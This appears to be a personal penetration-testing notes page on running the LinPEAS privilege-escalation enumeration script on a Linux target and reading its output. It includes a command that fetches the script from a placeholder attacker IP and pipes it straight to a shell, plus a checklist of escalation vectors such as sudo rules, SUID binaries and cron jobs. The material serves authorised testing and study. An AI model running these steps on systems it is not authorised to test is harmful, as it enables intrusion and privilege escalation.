
# LinPEAS

Part of the [PEASS-ng](https://github.com/peass-ng/PEASS-ng) suite. Automates Linux privilege escalation enumeration.

---

## Transfer to Target

→ [[File-Transfers]]

---

## Run

```bash
chmod +x linpeas.sh
./linpeas.sh

# Save output for review
./linpeas.sh | tee linpeas_output.txt

# In-memory  -  no file written to disk
curl http://<attacker-ip>/linpeas.sh | sh
```

---

## Output Color Guide

| Color | Meaning |
|-------|---------|
| RED + YELLOW | 99% privilege escalation vector  -  act on this |
| RED | Must investigate |
| Light Cyan | Users with a console (interactive users) |
| Blue | Users without console / mounted devices |
| Green | Common findings (users, groups, SUID, mounts, crons) |
| Light Magenta | Your current username |

---

## Key Sections to Focus On

Work top-down but prioritise these:

1. **Basic Information**  -  OS version, kernel, current user/groups
2. **Sudo version**  -  old versions have known exploits
3. **Sudo rules**  -  `sudo -l` output, NOPASSWD entries
4. **SUID/SGID binaries**  -  cross-reference with GTFOBins
5. **Cron jobs**  -  writable paths, scripts run as root
6. **Interesting files**  -  config files, password files, history
7. **Network info**  -  open ports, interfaces (pivot opportunities)

---

## See Also

- [[Privilege-Escalation]]  -  full PrivEsc methodology
- [GTFOBins](https://gtfobins.github.io/)  -  exploit anything LinPEAS flags
- [PEASS-ng GitHub](https://github.com/peass-ng/PEASS-ng)  -  latest release
